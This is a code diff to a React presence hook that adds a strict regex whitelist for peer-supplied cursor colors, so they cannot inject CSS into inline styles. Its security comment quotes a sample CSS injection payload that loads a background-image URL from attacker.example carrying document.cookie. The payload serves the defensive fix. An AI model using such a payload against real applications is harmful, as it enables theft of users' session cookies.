@@ -95,7 +95,21 @@ export function usePresence(channelName: string | null, self?: Partial<SimplePre
         RTL_OVERRIDE_RE.test(r.name) ||
         RTL_OVERRIDE_RE.test(r.id)
       ) return null;
-      const out: SimplePresence = { id: r.id, name: r.name, color: r.color };
+      // SECURITY: `color` flows directly into inline-style properties
+      // (border-color, background, color) on multiple cursor-overlay
+      // elements. React's inline-style API does NOT sanitize CSS
+      // values, so a peer broadcasting `color: "red; background-image:
+      // url(http://attacker.example/?steal=" + document.cookie + ")"`
+      // can exfiltrate data via the loaded image. CSS expression / -
+      // moz-binding XSS is dead in modern browsers, but URL-fetch
+      // exfiltration is alive and well. Restrict to a strict whitelist
+      // of CSS color forms: #rgb, #rrggbb, #rrggbbaa, rgb()/rgba()/hsl()/
+      // hsla() function calls (numbers + %, no urls), or a short
+      // letters-only named-color token. Anything else falls back to a
+      // safe default so the peer still appears but can't steer styles.
+      const COLOR_SAFE_RE = /^(?:#[0-9a-fA-F]{3,8}|rgba?\([0-9.,%\s]+\)|hsla?\([0-9.,%\s]+\)|[a-zA-Z]{1,32})$/;
+      const safeColor = COLOR_SAFE_RE.test(r.color.trim()) ? r.color.trim() : "#94a3b8";
+      const out: SimplePresence = { id: r.id, name: r.name, color: safeColor };
       if (r.cursor && typeof r.cursor === "object") {
         const c = r.cursor as { x?: unknown; y?: unknown };
         if (typeof c.x === "number" && Number.isFinite(c.x) &&
